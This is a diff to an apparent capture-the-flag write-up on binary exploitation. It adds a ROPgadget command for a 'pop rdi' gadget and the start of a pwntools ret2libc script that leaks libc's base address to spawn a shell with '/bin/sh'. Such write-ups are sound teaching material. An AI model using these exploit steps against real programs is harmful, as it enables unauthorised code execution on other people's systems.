@@ -120,7 +120,14 @@ The offset is `0x40 + 0x8` = `72`
 00001164  488d45c0           lea     rax, [rbp-0x40 {buf}]
 ```
 
-we extract `write` to calculate libc base. find `system` , `puts` and `/bin/sh`. finally build a rop chain to spawn shell using ret2libc.
+we extract `write` to calculate libc base. find `system` , `puts` and `/bin/sh`. finally build a rop chain to spawn shell using ret2libc. we use pop rdi gadget
+
+```shell
+ROPgadget --binary ./libc.so.6 | grep -E "pop rdi ; ret"
+0x0000000000028215 : pop rdi ; ret
+```
+
+The full exploit
 
 ```python
 from pwn import *
@@ -269,9 +276,6 @@ leak=target.recv()
 fflush_leak = int(re.findall(b'0x[a-f0-9]+',leak)[0].decode(),0)
 
 libc.address = fflush_leak - 0x00000000006b590
-system=libc.address +0x000000000049480
-puts=libc.address +0x00000000006da70
-exit=libc.address +0x00000000003c760
 shell=next(libc.search(b'/bin/sh\x00'))
 
 payload = b''
